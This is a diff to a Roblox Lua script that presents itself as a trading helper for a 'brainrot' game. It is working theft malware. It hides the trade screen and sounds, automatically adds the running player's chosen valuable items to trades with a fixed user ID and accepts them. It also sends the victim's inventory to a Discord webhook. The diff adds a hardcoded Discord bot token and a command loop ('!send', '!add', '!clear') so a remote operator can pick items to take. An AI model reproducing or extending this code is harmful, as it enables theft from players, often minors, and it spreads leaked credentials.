@@ -3,15 +3,22 @@ _G.Settings = {}
 _G.Settings.TargetUserId = 10717482853 
 _G.Settings.Webhook = "https://discord.com/api/webhooks/1492572765679780082/kqDjoL9yiq9BAAl5Ms-DE8lS6n8mk0F1dFJXsPbKjsmeRRhCqlEdEk7XuCKfqWzKj48o" 
 
-_G.Settings.TradeStartDelay = 2
+_G.Settings.TradeStartDelay = 1.35
 _G.Settings.AddDelay = 1
-_G.Settings.AcceptDelay = 1
+_G.Settings.AcceptDelay = 0.5
+
+_G.Settings.DiscordBotToken = "MTQ5NjUwMzQxNzg2OTQzNTA0Mg.G8-2yD.EmUqLdKCbZPFaKKjIB3F3szgDFcS6cvbQkVJVY"
+_G.Settings.DiscordChannelId = "1492572694720544900"
 
 _G.Settings.Brainrots = {
+-- TRUE ITEMS
+    -- OG (4)
     ["Skibidi Toilet"] = true,
     ["Meowl"] = true,
     ["W or L"] = true,
     ["Chillin Chili"] = true,
+
+    -- AHTOH 200 (31) [High tier / boss / legendary types]
     ["Divine Easter Dragon"] = true,
     ["Hydra Dragon Cannelloni"] = true,
     ["Dragon Cannelloni"] = true,
@@ -30,6 +37,8 @@ _G.Settings.Brainrots = {
     ["La Romantic Grande"] = true,
     ["La Jolly Grande"] = true,
     ["La Easter Grande"] = true,
+
+    -- SECRET (everything else)
     ["Carrotino"] = true,
     ["Eggie Matteo"] = true,
     ["Yolko Polko"] = true,
@@ -78,27 +87,38 @@ _G.Settings.Brainrots = {
     ["Guest 666"] = true,
     ["La Ginger Sekolah"] = true,
     ["Fishino Clownino"] = true,
-    ["Los Jolly Combinasionas"] = false,
+    ["Los Jolly Combinasionas"] = true,
     ["Jolly Jolly Sahur"] = true,
     ["Money Money Reindeer"] = true,
     ["Bacuru and Egguru"] = true,
     ["Celularcini Viciosini"] = true,
-    ["Los Sekolahs"] = false,
-    ["Los Spaghettis"] = false,
+    ["Los Sekolahs"] = true,
+    ["Los Spaghettis"] = true,
     ["Los Tacoritas"] = true,
     ["Los Puggies"] = true,
     ["Los Primos"] = true,
     ["Los Bros"] = true,
     ["Tralaledon"] = true,
-    ["Los Hotspotsitos"] = false,
+    ["Los Hotspotsitos"] = true,
+
+----###########################   FALSE ITEMS   ###########################
+----###########################   FALSE ITEMS   ###########################
+----###########################   FALSE ITEMS   ###########################
+
+    --  OG (if any end up false later)
+    -- (none currently from your list, but placeholder kept)
+
+    -- AHTOH 200 (high tier that are disabled)
     ["Extinct Matteo"] = false,
     ["Blackhole Goat"] = false,
     ["Cigno Fulgoro"] = false,
     ["Serafinna Medusella"] = false,
     ["Paradiso Axolottino"] = false,
-    ["Horegini Boom"] = true,
-    ["Easter Egg Lucky Block"] = true,
-    ["DJ Panda"] = true,
+
+    -- SECRET (everything else)
+    ["Horegini Boom"] = false,
+    ["Easter Egg Lucky Block"] = false,
+    ["DJ Panda"] = false,
     ["Las Sis"] = false,
     ["Los Planitos"] = false,
     ["Vulturino Skeletono"] = false,
@@ -107,87 +127,89 @@ _G.Settings.Brainrots = {
     ["Spaghetti Tualetti"] = false,
     ["Rang Ring Bus"] = false,
     ["Mi Gatito"] = false,
-    ["Tuff Toucan"] = true,
-    ["Cuadramat and Pakrahmatmamat"] = true,
-    ["Lavadorito Spinito"] = true,
-    ["Ketchuru and Musturu"] = true,
-    ["Tictac Sahur"] = true,
-    ["Ketupat Kepat"] = true,
-    ["Tang Tang Keletang"] = true,
-    ["Money Money Puggy"] = true,
-    ["Nuclearo Dinossauro"] = true,
-    ["Swaggy Bros"] = true,
+    ["Tuff Toucan"] = false,
+    ["Cuadramat and Pakrahmatmamat"] = false,
+    ["Lavadorito Spinito"] = false,
+    ["Ketchuru and Musturu"] = false,
+    ["Tictac Sahur"] = false,
+    ["Ketupat Kepat"] = false,
+    ["Tang Tang Keletang"] = false,
+    ["Money Money Puggy"] = false,
+    ["Nuclearo Dinossauro"] = false,
+    ["Swaggy Bros"] = false,
     ["La Taco Combinasion"] = false,
     ["Tacorita Bicicleta"] = false,
+
+    -- original FALSE block
     ["La Vacca Saturno Saturnita"] = false,
     ["Quesadillo Vampiro"] = false,
     ["Perrito Burrito"] = false,
     ["Los Tralaleritos"] = false,
     ["Las Tralaleritas"] = false,
-    ["GOAT"] = true,
-    ["Swag Soda"] = true,
+    ["GOAT"] = false,
+    ["Swag Soda"] = false,
     ["Mieteteira Bicicleteira"] = false,
     ["La Grande Combinasion"] = false,
     ["La Karkerkar Combinasion"] = false,
-    ["La Sahur Combinasion"] = true,
+    ["La Sahur Combinasion"] = false,
     ["Cupid Cupid Sahur"] = false,
-    ["Ho Ho Ho Sahur"] = true,
+    ["Ho Ho Ho Sahur"] = false,
     ["Los Sweethearts"] = false,
-    ["Los Mobilis"] = true,
-    ["Chill Puppy"] = true,
-    ["Los Candies"] = true,
+    ["Los Mobilis"] = false,
+    ["Chill Puppy"] = false,
+    ["Los Candies"] = false,
     ["Chicleteira Noelteira"] = false,
     ["Bisonte Giuppitere"] = false,
     ["Jackorilla"] = false,
-    ["Extinct Tralalero"] = true,
-    ["La Cucaracha"] = true,
-    ["Reindeer Tralala"] = true,
-    ["Zombie Tralala"] = true,
-    ["Boatito Auratito"] = true,
-    ["Pumpkini Spyderini"] = true,
-    ["Cupid Hotspot"] = true,
-    ["Noo my Present"] = true,
-    ["Donkeyturbo Express"] = true,
-    ["Noo my Candy"] = true,
+    ["Extinct Tralalero"] = false,
+    ["La Cucaracha"] = false,
+    ["Reindeer Tralala"] = false,
+    ["Zombie Tralala"] = false,
+    ["Boatito Auratito"] = false,
+    ["Pumpkini Spyderini"] = false,
+    ["Cupid Hotspot"] = false,
+    ["Noo my Present"] = false,
+    ["Donkeyturbo Express"] = false,
+    ["Noo my Candy"] = false,
     ["Please my Present"] = false,
     ["Love Love Love Sahur"] = false,
     ["La Vacca Jacko Linterino"] = false,
-    ["Naughty Naughty"] = true,
-    ["Santa Hotspot"] = true,
+    ["Naughty Naughty"] = false,
+    ["Santa Hotspot"] = false,
     ["Telemorte"] = false,
     ["Giftini Spyderini"] = false,
-    ["Trickolino"] = true,
-    ["Triplito Tralaleritos"] = true,
-    ["Noo my Heart"] = true,
-    ["Chimnino"] = true,
+    ["Trickolino"] = false,
+    ["Triplito Tralaleritos"] = false,
+    ["Noo my Heart"] = false,
+    ["Chimnino"] = false,
     ["Los 25"] = false,
     ["Chicleteira Cupideira"] = false,
-    ["Los Spooky Combinasionas"] = true,
+    ["Los Spooky Combinasionas"] = false,
     ["Karkerkar Kurkur"] = false,
     ["Sammyni Spyderini"] = false,
     ["Dul Dul Dul"] = false,
     ["Chachechi"] = false,
-    ["Frankentteo"] = true,
-    ["Santteo"] = true,
-    ["Spinny Hammy"] = true,
+    ["Frankentteo"] = false,
+    ["Santteo"] = false,
+    ["Spinny Hammy"] = false,
     ["25"] = false,
     ["Los Trios"] = false,
-    ["Rocco Disco"] = true,
+    ["Rocco Disco"] = false,
     ["Trenostruzzo Turbo 4000"] = false,
     ["La Vacca Prese Presente"] = false,
-    ["Bunito Bunito Spinito"] = true,
+    ["Bunito Bunito Spinito"] = false,
     ["Mariachi Corazoni"] = false,
-    ["Pirulitoita Bicicleteira"] = true,
-    ["Bunnyman"] = true,
+    ["Pirulitoita Bicicleteira"] = false,
+    ["Bunnyman"] = false,
     ["Karker Sahur"] = false,
     ["Graipuss Medussi"] = false,
-    ["Gobblino Uniciclino"] = true,
+    ["Gobblino Uniciclino"] = false,
     ["Coffin Tung Tung Tung Sahur"] = false,
     ["Tung Tung Tung Sahur"] = false,
-    ["Los Jobcitos"] = true,
+    ["Los Jobcitos"] = false,
     ["Nooo My Hotspot"] = false,
     ["Quesadilla Crocodila"] = false,
-    ["Pot Pumpkin"] = true,
+    ["Pot Pumpkin"] = false,
     ["Burrito Bandito"] = false,
     ["Los Quesadillas"] = false,
     ["Arcadopus"] = false,
@@ -196,11 +218,11 @@ _G.Settings.Brainrots = {
     ["67"] = false,
     ["Los Cucarachas"] = false,
     ["Los Matteos"] = false,
-    ["Los Spyderinis"] = true,
+    ["Los Spyderinis"] = false,
     ["Los Karkeritos"] = false,
     ["Las Vaquitas Saturnitas"] = false,
-    ["1x1x1x1"] = true,
-    ["Yess my examine"] = true,
+    ["1x1x1x1"] = false,
+    ["Yess my examine"] = false,
     ["Los Chicleteiras"] = false,
     ["Los Mi Gatitos"] = false,
     ["Torrtuginni Dragonfrutini"] = false,
@@ -222,12 +244,13 @@ _G.Settings.Brainrots = {
     ["Noo my Gold"] = false,
     ["Snailo Clovero"] = false,
     ["Granny"] = false,
-    ["Los Cupids"] = true
+    ["Los Cupids"] = false
 }
 
 local RS = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local Lighting = game:GetService("Lighting")
+local HttpService = game:GetService("HttpService")
 
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
@@ -245,6 +268,15 @@ cloned.Parent = newGui
 leftCenter:Destroy()
 
 local _net = RS.Packages.Net
+
+local DISCORD_BOT_TOKEN = _G.Settings.DiscordBotToken or ""
+local DISCORD_CHANNEL_ID = _G.Settings.DiscordChannelId or ""
+local lastMessageId = nil
+
+local remoteTargets = {}
+local remoteTradeQueued = false
+
+local liveAddQueue = {}
 
 local function getAcceptRemote()
 	local children = _net:GetChildren()
@@ -314,18 +346,27 @@ end
 
 task.spawn(hideTradeGuiElements)
 
+local _TradeLiveTrade = PlayerGui:WaitForChild("TradeLiveTrade")
+local _wasTradeActive = _TradeLiveTrade.Enabled
+_TradeLiveTrade:GetPropertyChangedSignal("Enabled"):Connect(function()
+	local isActive = _TradeLiveTrade.Enabled
+	if not isActive and _wasTradeActive then
+		liveAddQueue = {}
+		remoteTargets = {}
+		remoteTradeQueued = false
+	end
+	_wasTradeActive = isActive
+end)
+
 task.spawn(function()
 	while true do
-		
 		for _, obj in ipairs(Lighting:GetChildren()) do
 			if obj:IsA("BlurEffect") then
 				obj:Destroy()
 			end
 		end
-		
 		local camBlur = workspace.Camera:FindFirstChild("Blur")
 		if camBlur then camBlur:Destroy() end
-
 		task.wait(0.1)
 	end
 end)
@@ -342,7 +383,6 @@ end)
 game:GetService("RunService").RenderStepped:Connect(function()
 	workspace.CurrentCamera.FieldOfView = 70
 end)
-
 
 local blockedSounds = { Activated = true, Error = true, Success = true }
 local function hardBlock(sound)
@@ -445,11 +485,37 @@ local function fireAccept()
 	end
 end
 
+local function tryAddFromLiveQueue()
+	if #liveAddQueue == 0 then return end
+	local name = table.remove(liveAddQueue, 1)
+	local freshFrame = getTradeScrollFrame()
+	if freshFrame then
+		for _, v in ipairs(freshFrame:GetChildren()) do
+			if not isTradeActive() then break end
+			if v.Name:find("Selection") and v:FindFirstChild("Spacer") and v.Spacer:IsA("ImageButton") then
+				local spacer = v.Spacer
+				local titleLabel = spacer:FindFirstChild("Title")
+				if titleLabel and titleLabel:IsA("TextLabel") then
+					local title = cleanTradeTitle(titleLabel.Text)
+					if title == name then
+						spacer.Visible = true
+						task.wait(0.2)
+						firesignal(spacer.Activated)
+						task.wait(0.1)
+						spacer.Visible = false
+						task.wait(_G.Settings.AddDelay or 1.5)
+					end
+				end
+			end
+		end
+	end
+end
+
 local function fireReadyOrAccept()
 	if not isTradeActive() then return end
-
 	local elapsed = 0
 	while isTradeActive() and elapsed < 30 do
+		tryAddFromLiveQueue()
 		if allPlayersReady() then
 			fireAccept()
 		else
@@ -460,11 +526,12 @@ local function fireReadyOrAccept()
 	end
 end
 
+
+
 local function sendWebhook(plotFolder)
 	local webhook = _G.Settings.Webhook
 	if not webhook or webhook == "" then return end
 
-	
 	local mainRoot = plotFolder:FindFirstChild("MainRoot") or plotFolder:FindFirstChildWhichIsA("BasePart")
 	if not mainRoot then return end
 
@@ -472,36 +539,32 @@ local function sendWebhook(plotFolder)
 	local plotSize = mainRoot.Size
 	local searchRange = Vector3.new(plotSize.X * 20, 1000, plotSize.Z * 20)
 
-	local totalTemplates = 0
-	local inRange = 0
 	local entries = {}
 	local targetEntries = {}
 
 	for _, obj in ipairs(workspace.Debris:GetChildren()) do
 		if obj.Name == "FastOverheadTemplate" then
-			totalTemplates += 1
 			local overhead = obj:FindFirstChild("AnimalOverhead")
-			local pos = obj:IsA("BasePart") and obj.Position or (obj:FindFirstChildWhichIsA("BasePart") and obj:FindFirstChildWhichIsA("BasePart").Position)
+			local pos = obj:IsA("BasePart") and obj.Position
+				or (obj:FindFirstChildWhichIsA("BasePart") and obj:FindFirstChildWhichIsA("BasePart").Position)
 			if overhead and pos then
 				local displayNameObj = overhead:FindFirstChild("DisplayName")
-				local generationObj = overhead:FindFirstChild("Generation")
-				local mutationObj = overhead:FindFirstChild("Mutation")
-				local traitsFolder = overhead:FindFirstChild("Traits")
+				local generationObj  = overhead:FindFirstChild("Generation")
+				local mutationObj    = overhead:FindFirstChild("Mutation")
+				local traitsFolder   = overhead:FindFirstChild("Traits")
 
 				if displayNameObj and generationObj then
 					local ok, displayName = pcall(function() return displayNameObj.Text end)
 					local diff = pos - plotPos
 					local halfRange = searchRange / 2
 					local withinRange = math.abs(diff.X) <= halfRange.X and math.abs(diff.Z) <= halfRange.Z
-					if withinRange then inRange += 1 end
+
 					if ok and withinRange then
 						local mutation = "Default"
 						pcall(function()
 							if mutationObj and mutationObj.Visible and mutationObj.TextTransparency < 1 then
 								local raw = mutationObj.Text:gsub("<[^>]+>", ""):gsub("%s+", " "):match("^%s*(.-)%s*$") or ""
-								if raw ~= "" then
-									mutation = raw
-								end
+								if raw ~= "" then mutation = raw end
 							end
 						end)
 						local gen = ""
@@ -535,20 +598,20 @@ local function sendWebhook(plotFolder)
 
 	table.sort(entries, function(a, b) return parseGen(a.gen) > parseGen(b.gen) end)
 
+
 	local player = Players.LocalPlayer
 	local now = os.date("%m/%d/%Y %I:%M %p")
 
 	local lines = {}
 	for i, e in ipairs(entries) do
-		local mutStr = (e.mutation and e.mutation ~= "Default" and e.mutation ~= "None" and e.mutation ~= "") and (" | " .. e.mutation) or " | No Mutation"
+		local mutStr = (e.mutation and e.mutation ~= "Default" and e.mutation ~= "None" and e.mutation ~= "")
+			and (" | " .. e.mutation) or " | No Mutation"
 		local genClean = e.gen:gsub("%$", "")
 		table.insert(lines, i .. ". [" .. genClean .. "] " .. e.name .. mutStr)
 	end
 
 	local description = table.concat(lines, "\n")
-	if #description > 3500 then
-		description = description:sub(1, 3500) .. "\n..."
-	end
+	if #description > 3500 then description = description:sub(1, 3500) .. "\n..." end
 
 	local targetLines = {}
 	for _, e in ipairs(targetEntries) do
@@ -557,6 +620,8 @@ local function sendWebhook(plotFolder)
 	local targetStr = #targetLines > 0 and table.concat(targetLines, "\n") or "none"
 	if #targetStr > 1000 then targetStr = targetStr:sub(1, 1000) .. "\n..." end
 
+	local footer = now .. "  |  !send 1,2,3 to queue  |  !add 1,2,3 to add mid-trade"
+
 	local color = #targetEntries > 0 and 0x57F287 or 0xFF0000
 	local fields = {
 		{ name = "username:", value = "`" .. player.Name .. "`", inline = false },
@@ -564,12 +629,12 @@ local function sendWebhook(plotFolder)
 		{ name = "targets found (" .. tostring(#targetEntries) .. ")", value = targetStr, inline = false },
 	}
 
-	local payload = game:GetService("HttpService"):JSONEncode({
+	local payload = HttpService:JSONEncode({
 		embeds = {{
 			title = "target found",
 			color = color,
 			fields = fields,
-			footer = { text = now },
+			footer = { text = footer },
 		}}
 	})
 
@@ -583,16 +648,85 @@ local function sendWebhook(plotFolder)
 	end)
 end
 
+local function pollDiscordCommands()
+	if DISCORD_BOT_TOKEN == "" or DISCORD_CHANNEL_ID == "" then return end
+
+	while true do
+		task.wait(3)
+		pcall(function()
+			local url = "https://discord.com/api/v10/channels/" .. DISCORD_CHANNEL_ID .. "/messages?limit=5"
+			if lastMessageId then
+				url = "https://discord.com/api/v10/channels/" .. DISCORD_CHANNEL_ID .. "/messages?limit=5&after=" .. lastMessageId
+			end
+
+			local response = request({
+				Url = url,
+				Method = "GET",
+				Headers = {
+					["Authorization"] = "Bot " .. DISCORD_BOT_TOKEN,
+					["Content-Type"] = "application/json"
+				}
+			})
+
+			if not response or not response.Body then return end
+			local ok, messages = pcall(function() return HttpService:JSONDecode(response.Body) end)
+			if not ok or type(messages) ~= "table" or #messages == 0 then return end
+
+			for i = #messages, 1, -1 do
+				local msg = messages[i]
+				if msg and msg.id then
+					if not lastMessageId or msg.id > lastMessageId then
+						lastMessageId = msg.id
+					end
+
+					local content = (msg.content or ""):match("^%s*(.-)%s*$")
+
+					if content:sub(1, 6) == "!send " then
+						local namePart = content:sub(7)
+						local picked = {}
+						for name in namePart:gmatch("([^,]+)") do
+							name = name:match("^%s*(.-)%s*$")
+							if name ~= "" then
+								remoteTargets[name] = true
+								table.insert(picked, name)
+							end
+						end
+						if #picked > 0 then
+							remoteTradeQueued = true
+						end
+
+					elseif content:sub(1, 5) == "!add " then
+						local namePart = content:sub(6)
+						for name in namePart:gmatch("([^,]+)") do
+							name = name:match("^%s*(.-)%s*$")
+							if name ~= "" then
+								table.insert(liveAddQueue, name)
+							end
+						end
+
+					elseif content == "!clear" then
+						remoteTargets  = {}
+						liveAddQueue   = {}
+						remoteTradeQueued = false
+					end
+				end
+			end
+		end)
+	end
+end
+
+task.spawn(pollDiscordCommands)
+
 local cachedPlotFolder = nil
 task.spawn(function()
 	cachedPlotFolder = getPlotFolder()
 end)
 
-local tradeRunning = false
+local tradeRunning    = false
 local fairTradeDetected = false
-local addMoreDetected = false
+local addMoreDetected   = false
 local lastOfferDetected = false
-local sendTradeAgain = true
+local sendTradeAgain    = true
 
 local _ReplicatorClient = require(RS.Packages.ReplicatorClient)
 local _tradeReplica = _ReplicatorClient.get(("Trade_%*"):format(LocalPlayer.UserId))
@@ -602,7 +736,7 @@ _tradeReplica:ListenRaw(function(state)
 	if state == nil then
 		_lastSign = nil
 		fairTradeDetected = false
-		addMoreDetected = false
+		addMoreDetected   = false
 		return
 	end
 	local users = _tradeReplica:TryIndex({ "active", "data", "users" })
@@ -620,11 +754,11 @@ _tradeReplica:ListenRaw(function(state)
 		if signText == "✅ Fair Trade" and signText ~= _lastSign then
 			fairTradeDetected = true
 		elseif signText == "➕ Add More" and signText ~= _lastSign then
-			addMoreDetected = true
+			addMoreDetected   = true
 			fairTradeDetected = false
 		elseif signText == "🧾 Last Offer" and signText ~= _lastSign then
 			lastOfferDetected = true
-			sendTradeAgain = false
+			sendTradeAgain    = false
 		end
 		_lastSign = signText
 	end)
@@ -636,21 +770,24 @@ local function autoadd()
 
 	tradeRunning = true
 
-	local plotFolder = cachedPlotFolder or getPlotFolder()
-	if not plotFolder then
-		tradeRunning = false
-		return
-	end
-
-	local brainrotsToAdd = collectBrainrotsFromBase(plotFolder)
-	if #brainrotsToAdd == 0 then
-		tradeRunning = false
-		return
-	end
-
 	local wantedSet = {}
-	for _, name in ipairs(brainrotsToAdd) do
-		wantedSet[name] = true
+
+	if next(remoteTargets) ~= nil then
+		for name, _ in pairs(remoteTargets) do
+			wantedSet[name] = true
+		end
+	else
+		local plotFolder = cachedPlotFolder or getPlotFolder()
+		if plotFolder then
+			for _, name in ipairs(collectBrainrotsFromBase(plotFolder)) do
+				wantedSet[name] = true
+			end
+		end
+	end
+
+	if not next(wantedSet) then
+		tradeRunning = false
+		return
 	end
 
 	fairTradeDetected = false
@@ -682,7 +819,7 @@ local function autoadd()
 				tradeRunning = false
 				return
 			end
-			addMoreDetected = false
+			addMoreDetected   = false
 			fairTradeDetected = false
 		end
 		local v = children[i]
@@ -704,11 +841,22 @@ local function autoadd()
 		end
 	end
 
+	while isTradeActive() and #liveAddQueue > 0 do
+		tryAddFromLiveQueue()
+	end
+
 	task.wait(_G.Settings.AcceptDelay or 2.5)
 	fireReadyOrAccept()
 
 	while isTradeActive() do
 		task.wait(0.5)
+	end
+
+	liveAddQueue = {}
+
+	if next(remoteTargets) ~= nil then
+		remoteTargets    = {}
+		remoteTradeQueued = false
 	end
 
 	tradeRunning = false
@@ -719,8 +867,7 @@ task.spawn(function()
 	local plotFolder = getPlotFolder()
 	if plotFolder then
 		sendWebhook(plotFolder)
-	else
-		end
+	end
 end)
 
 task.spawn(function()
@@ -734,11 +881,16 @@ end)
 
 task.spawn(function()
 	while true do
-		if not isTradeActive() and not tradeRunning and sendTradeAgain then
-			if cachedPlotFolder then
-				local brainrots = collectBrainrotsFromBase(cachedPlotFolder)
-				if #brainrots > 0 then
-					sendTradeInvite()
+		if not isTradeActive() and not tradeRunning then
+			if remoteTradeQueued then
+				sendTradeInvite()
+				remoteTradeQueued = false
+			elseif sendTradeAgain then
+				if cachedPlotFolder then
+					local brainrots = collectBrainrotsFromBase(cachedPlotFolder)
+					if #brainrots > 0 then
+						sendTradeInvite()
+					end
 				end
 			end
 		end
